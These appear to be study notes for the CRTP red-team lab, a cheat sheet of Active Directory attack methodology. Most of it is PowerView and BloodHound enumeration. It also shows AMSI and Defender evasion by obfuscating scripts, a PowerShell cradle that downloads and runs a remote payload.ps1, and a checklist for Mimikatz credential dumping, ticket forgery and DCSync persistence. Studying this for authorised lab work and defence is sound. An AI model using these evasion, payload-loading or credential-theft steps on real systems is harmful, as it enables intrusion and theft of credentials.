# CRTP One Week Challenge

# PowerShell

Bypassing PowerShell Security using Invisi-Shell  (https://github.com/OmerYa/Invisi-Shell)
```
RunWithPathAsAdmin.bat  (Admin Privilege)
RunWithRegistryNonAdmin.bat  (non-Admin Privilege)
```

Load a script and module (local)
```
. C:\AD\Tools\PowerView.ps1
OR
Import-Module C:\AD\Tools\PowerView.ps1
```

list all the commands u can use in a particular module
```
Get-Command -Module <modulename>
```

Load a script and module (remotely)
-     ine (New-Object Net.WebClient).DownloadString('http://10.10.16.10/payload.ps1')

Bypassing AV Signatures for PowerShell
.      Invoke-Mimi & Invoke-MimiEx are the obfuscated tools of Invoke-Mimikatz
.      if u r going to run a PowerShell script from the disk it may get detected; u can use the AMSITrigger (https://github.com/RythmStick/AMSITrigger) tool to identify the exact part of a script that is detected
.      Scan using AMSITrigger 'AmsiTrigger_x64.exe -i PowerUp.ps1' | Modify the detected code by reversing ex. 'System.AppDomain' to 'niamoDppA.metsyS' | Rescan using AMSITrigger | Repeat the steps till u get a result as "AMSI_RESULT_NOT_DETECTED"
.      u can use DefenderCheck (https://github.com/t3hbb/DefenderCheck) to identify code and strings from a binary / file that Windows Defender may flag
.      simply provide path to the script file to scan it
-     AmsiTrigger_x64.exe -i C:\AD\Tools\Invok-PowerShellTcp_Detected.ps1 DefenderCheck.exe PowerUp.ps1
.      for full obfuscation of PowerShell scripts use Invoke-Obfuscation (https://github.com/danielbohannon/Invoke-Obfuscation)
example of minimal obfuscation; if u run powerup.ps1 and the following line got detected "New-Object System.Net.Sockets.TCPClient($IP,$PORT)"
## Reverse the "Net.Sockets" string on line number 32
```
$string = "stekcoS.teN"
$class = ([regex]::Matches($String,'.','RightToLeft') | ForEach {$_.value}) -join ''
if ($Reverse)
{
$client = New-Object System.$class.TCPClient($IPAddress,$PORT)
}
```

# Methodology Master
---
## 0. Miscellaneous
> 1. [ ] Remember to bypass AMSI on every new user
> 2. [ ] Check the Execution policy language mode
> 3. [ ] Check all the commands you are allowed to execute

## 1. Domain Enumeration
> 1. [ ] Complete basic Enum
> 2. [ ] enumerate all users
> 3. [ ] enumerate all domain computers
> 4. [ ] GPO && OU
> 5. [ ] ACL's 
> 6. [ ] Trusts
> 7. [ ] Blood-hound
> 8. [ ] SPN

## 2. Local Priv Esc
> 1. [ ] Run *powerups.ps1*
> 2. [ ] **ServiceUnquoted**
> 3. [ ] **ModifiableServiceFile**
> 4. [ ] **ModifiableService**
> 5. [ ] Priv Esc for the above use : **Invoke-ServiceAbuse**
> 6. [ ] **whoami /all** || **whoami /priv**
> 7. [ ] Check Windows abuse and priv esc
> 8. [ ] Hunt for Local Admin users if available from Trust Enum
> 9. [ ] Priv Esc for the above use : PSsession or refer **Invoke-Command**
> 10. [ ] Check if you can Priv esc using *jenkins*
> 11. [ ] Lastly add the user to the localgroup administrators

**NOTE : ONCE A LOCAL ADMINISTRATOR RUN PS as ADMINISTRATOR**

## 3. Domain Admin Priv Esc
> 1. [ ] Hunt for Local Admin Users
> 2. [ ] Check The local Admin Access
> 3. [ ] If yes, Use **Invoke-Command** or **Enter-PSSession**

## 4. Domain Admin Persistence [app locker enabled]
> 1. [ ] Check the Execution policy language mode
> 2. [ ] Checking AppLockerPolicy and note the paths available for us
> 3. [ ] Disable Defender protections
> 4. [ ] Modify Invoke-Mimikatz.ps1 script to call the function in the script itself because we can't dot source files if in constrained language mode
> 5. [ ] run script without dot sourcing it
> 6. [ ] Dump the hashes
> 7. [ ] Get the ekeys
> 8. [ ] Get Credentials from the credentials vault

## 5. Domain Admin Persistence
> 1. [ ] Dump the hashes us the user using *Invoke-Mimikatz*
> 2. [ ] Get the ekeys
> 3. [ ] Get Credentials from the credentials vault
> 4. [ ] Using *Over-Pass-the-Hash Attack* spawn a PowerShell session as that user

## 6. New user from DA Priv Esc
> 1. [ ] Follow the same exact steps from **3. to 5.** if a new user is found

## 7. DC pwn
> 1. [ ] After we get a DA user with Administrator access we can connect to the DC using **Enter-PSSession**

## 8. Domain Controller Persistence
> 1. [ ] Golden Ticket
> 2. [ ] Silver Ticket
> 3. [ ] DSRM
> 4. [ ] ACL AdminSDHolder
> 5. [ ] ACL DCSync
> 6. [ ] ACL security Descriptors

## 9. Forest Priv Esc

> 1. [ ] Forge inter-forest ticket by trust keys

---

# Domain Enumeration - Basic
Enumerate following for the dollarcorp domain:
> 1. [ ] Users
```
Get-DomainUser	#check the name at the end
Get-DomainUser | select -ExpandProperty samaccountname #list a specific property of all the users
```
> 2. [ ] Computers
```
Get-DomainComputer | select -ExpandProperty dnshostname #list computers
```
> 3. [ ] Domain Administrators
```
Get-DomainGroup | select name #list domain admin group name
Get-DomainGroup -Identity "Domain Admins" #details of the domain admins
Get-DomainGroupMember -Identity "Domain Admins" #enumerate members of the domain admins group. check MemberName & MemberSID
```
> 4. [ ] Enterprise Administrators
```
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local #enumerate enterprise admin. you can get the domain name from computer enum
```
- run Invisi-Shell then PowerView before Domain Enumeration (bypassing AMSI & loading PowerView)
```
RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerView.ps1
```
Get current domain
```
Get-NetDomain  #check name, Forest, DomainControllers, Children, Parent...
```
Get object of another domain
```
Get-NetDomain -Domain moneycorp.local
```
Get domain SID for the current domain  (security identifier)
```
Get-DomainSID  #will be used in other attacks
```
Get domain policy for the current domain
```
Get-DomainPolicy  
(Get-DomainPolicy)."Kerberos Policy" #Kerberos tickets info(MaxServiceAge)
(Get-DomainPolicy)."System Access" #Password policy
(Get-DomainPolicy).PrivilegeRights #Check your privileges
```
Get domain policy for another domain
```
(Get-DomainPolicy -domain moneycorp.local)."system access"
(Get-DomainPolicy -domain moneycorp.local)."kerberos policy"
(Get-DomainPolicy -domain moneycorp.local)."Privilege Rights"
```
Get domain controllers for the current domain
```
Get-NetDomainController #check name
```
Get domain controllers for another domain
```
Get-NetDomainController -Domain moneycorp.local  #check name
```
Get a list of all users in the current domain
```
Get-DomainUser  #list all users
Get-DomainUser -Identity student1  OR Get-DomainUser -Username student1  #select the information only for student1
Get-DomainUser -Identity student1 -Properties *  //maybe only for AD module u need to check
Get-DomainUser | select samaccountname,logonCount  #Get specific property of all users
Get-DomainUser -LDAPFilter "Description=*built*" | select name,Description
```
Get list of all properties for users in the current domain
```
Get-UserProperty
Get-UserProperty -Properties pwdlastset,logoncount,badpwdcount
Get-UserProperty -Properties logoncount  #if the user has a low number of logons. user can be a decoy
Get-UserProperty -Properties badpwdcount
```
search for a particular string in a user's attributes (Description)
```
Get-DomainUser -LDAPFilter "Description=*built*" | select name,Description
Find-UserField -SearchField Description -SearchTerm "built"
```
Get a list of computers in the current domain
```
Get-DomainComputer  #get all computers
Get-DomainComputer | select cn,logonCount
Get-DomainComputer -OperatingSystem "*Server 2016*"
Get-DomainComputer -Ping  #check if the machine is alive or not. if firewall is on this may give u a false positive
Get-DomainComputer -FullData  #list of all data including SID
```
Get all the groups in the current domain
Enterprise admin group  won't be listed cause it's at the root of the forest
```
Get-DomainGroup | select name
Get-DomainGroup -Domain <targetdomain> | select cn
Get-DomainGroup -FullData
Get-NetComputer -Domain
```
Get all groups containing the word "admin" in group name
Enterprise admin group  won't be listed cause it's at the root of the forest
```
Get-DomainGroup *admin*
Get-DomainGroup -GroupName *admin*  #all groups with admin name (excluding the root of the forest)
Get-DomainGroup -GroupName *admin* -Doamin moneycorp.local  #check the forest root (this will return enterprise admin group)
Get-DomainGroup *Domain Admins* -FullData  #get full data of the domain admin group
```
Get all the members of the Domain Admins group
```
Get-DomainGroupMember -Identity "Domain Admins" -Recurse  # check the name & always check the RID in SID if it is 500; if yes means the user is admin
Get-DomainGroup -GroupName 'Enterprise Admins' -Domain moneycorp.local (we added the domain to check the root as well)
Get-DomainGroup -GroupName 'Administrators'  #check the MemberName & IsGroup; if IsGroup is false means this is a user
Get-DomainGroupMember -GroupName 'Administrators' -Recurse  #Enum the membership of a group from the above command
```
Get the group membership for a user
opposite to the above command
```
Get-DomainGroup -UserName "student1" | select name
```
List all the local groups on a machine (needs administrator privs on non-dc machines)
```
Get-NetLocalGroup -computerName dcorp-dc
Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local  #membership of the groups on the domain controller
Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -ListGroups  #list groups on the domain controller
```
Get members of all the local groups on a machine (needs administrator privs on non-dc machines)
```
Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Recurse
```
Get members of the local group "Administrators" on a machine (needs administrator privs on non-dc machines)
```
Get-NetLocalGroupMember -ComputerName dcorp-dc -GroupName Administrators
```
Get actively logged users on a computer (needs local admin rights on the target)
```
Get-NetLoggedon -ComputerName dcorp-dc.dollarcorp.moneycorp.local 
```
Get locally logged users on a computer (needs remote registry on the target - started by-default on server OS)
```
Get-LoggedonLocal -ComputerName dcorp-dc.dollarcorp.moneycorp.local 
```
Get the last logged user on a computer (needs administrative rights and remote registry on the target)
```
Get-LastLoggedon -ComputerName <servername>
```
Find shares on hosts in the current domain.
```
Invoke-ShareFinder -Verbose
Invoke-ShareFinder -Verbose -ExcludeStandard -ExcludePrint -ExcludeIPC  #Exclude common or default shares
```
Find sensitive files on computers in the domain
```
Invoke-FileFinder -Verbose
```
Get all fileservers of the domain
```
Get-NetFileServer -Verbose
```
Enumerate Enterprise Administrators
```
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local
```

---

# Domain Enumeration - Group Policy Object Enumeration
Enumerate the following for the dollarcorp domain:
> 1. [ ] List all the OUs
```
Get-DomainOU #check the name in the output
Get-DomainOU | select -ExpandProperty name #see only the names
```
> 2. [ ] List all the computers in the StudentMachines OU
```
(Get-DomainOU -Identity StudentMachines).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
```
> 3. [ ] List the GPOs
```
Get-DomainGPO
```
> 4. [ ] Enumerate GPO applied on the StudentMachines OU
```
Get-DomainGPO -Identity "{AB306569-220D-43FF-BO3B-83E8F4EF8081}"
```
Get list of GPO in current domain.
```
Get-DomainGPO | select displayname  #display all policies
Get-DomainGPO -ComputerName dcorp-student1.dollarcorp.moneycorp.local  #check if any of the GPO applied on particular machine. check displayname ex. students policy is applied on the machine
```
List all the computer in the StudentMachines OU
```
(Get-Domain -Identity StudentMachines).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
```
Get GPO(s) which use Restricted Groups or groups.xml for interesting users
```
Get-DomainGPOLocalGroup
```
Get users who are in a local group of a machine using GPO
```
Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity dcop-student1
```
Get machines where the given user is member of a specific group
```
Get-DomainGPOUserLocalGroupMapping -Identity student -Verbose
```
Get OUs in a domain
```
Get-DomainOU -FullData  #list of organizational unit in the domain
```
Get GPO applied on an OU. Read GPOName from gplink attribute from Get-NetOU
```
Get-DomainGPO -Identity "{AB306569-220D-43FF-BO3B-83E8F4EF8081}"  #group policy that is applied on the OU. check displayname ex. group policy student is applied
```

# Domain Enumeration - Access Control List Enumeration  (better to use bloodhound)
ACL is a list of Access Control Entries (ACE) - ACE corresponds to individual permission or audits. who has permission and what can be done
- DACL - Defines the permissions trustees.
- SACL - Logs success and failure audit messages when an object is accessed.
> 1. [ ] ACL for the Domain Admins group
```
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose #check ObjectAceType
```
> 2. [ ] Check all modify rights/permissions for the studentx
```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "studentx"}
```
> 3. [ ] Check modify rights/permissions for the studentx in RDPUsers group as user is a member of it
```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```
Get the ACLs associated with the specified object (groups)
```
Get-DomainObjectAcl -SamAccountName student1 -ResolveGUIDs  #get a list of Aces from student1. check ObjectDN, IdentityReference, ActiveDirectoryRights
```
Get the ACLs associated with the specified prefix to be used for search
```
Get-DomainObjectAcl -ADSprefix 'CN=Administrator,CN=Users' -Verbose
```
We can also enumerate ACLs using ActiveDirectory module but without resolving GUIDs
won't work in PowerView
```
(Get-Acl "AD:\CN=Administrator, CN=Users, DC=dollarcorp, DC=moneycorp,DC=local").Access
```
Get the ACLs associated with the specified LDAP path to be used for search
```
Get-DomainObjectAcl -SearchBase 'LDAP://CN=DomainAdmins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local' -ResolveGUIDs -Verbose
```
Search for interesting ACEs
```
Find-InterestingDomainAcl -ResolveGUIDs
```
Get the ACLs associated with the specified path
```
Get-PathAcl -Path "\\dc.mydomain.local\sysvol" 
```

# Domain Enumeration - Trusts Enumeration

> 1. [ ] Enumerate all domains in the moneycorp.local forest
```
Get-ForestDomain -Verbose #enumerate all domains in the current forest. check name
```
> 2. [ ] Map the trusts of the dollarcorp.moneycorp.local domain
```
Get-DomainTrust #check SourceName, TargetName, TrustsAttributes, and TrustDirection
```
> 3. [ ] Map External trusts in meneycorp.local forest
```
Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"} #check TrustAttributes
``` 
> 4. [ ] Identify external trusts of dollarcorp domain. can you enumerate trusts for a trusting forest?
```
Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"} #check TrustAttribut
```
> 5. [ ] Enumerate trusts for eurocop.local forest
```
Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -Domain $_.Name}
```
Get a list of all domain trusts for the current domain
```
Get-DomainTrust  #check trust relationship
Get-DomainTrust -Domain us.dollarcorp.moneycorp.local  #check the trust for different domain
```
Get details about the current forest
```
Get-Forest  #get the details about forest. check domains, GlobalCatalogs
Get-Forest -Forest eurocorp.local  #get the details about different forest. check domains, GlobalCatalogs
```
Get all domains in the current forest
```
Get-ForestDomain  #list of domains in the current forest
Get-ForestDomain -Forest eurocorp.local  #list of domains in different forest
```
Get all global catalogs for the current forest
```
Get-ForestGlobalCatalog  #check global catalogs of the current forest
Get-ForestGlobalCatalog -Forest eurocorp.local  #check global catalogs of different forest
```
Map trusts of a forest
```
Get-ForestTrust  #if u get nothing means there is no forest relationship trust in the current forest
Get-ForestTrust -Forest eurocorp.local  #check the forest relationship trust for external forest 
```
Map External trusts in meneycorp.local forest
```
Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```

# User Hunting
Find all machines on the current domain where the current user has local admin access (admin access in another machine)
```
Find-LocalAdminAccess -Verbose
```
Find computers where a domain admin (or specified user/group) has sessions
```
powershell -ep bypass   #If u get an error module can't be loaded
. C:\AD\Tools\Invoke-SessionHunter.ps1
Invoke-SessionHunter
OR
Invoke-UserHunter
Invoke-UserHunter -GroupName "RDPUsers"
```
To confirm admin access
```
Invoke-UserHunter -CheckAccess
```
Find computers where a domain admin is logged in
```
Invoke-UserHunter -Stealth  #Will only go to the high-value targets
```
Get users with privileges in other domains inside the forest
```
Get-DomainForeingUser 
```
Get groups with privileges in other domains inside the forest
```
Get-DomainForeignGroupMember 
```

# BloodHound Enumeration
Enable Sharp-Hound and execute
```
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All,LoggedOn
Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
```
To avoid detections like ATA
```
Invoke-BloodHound -CollectionMethod All -ExcludeDC
```
Start neo4j and BloodHound UI on kali machine and load the zip/json files
```
sudo neo4j console&;bloodhound&
```

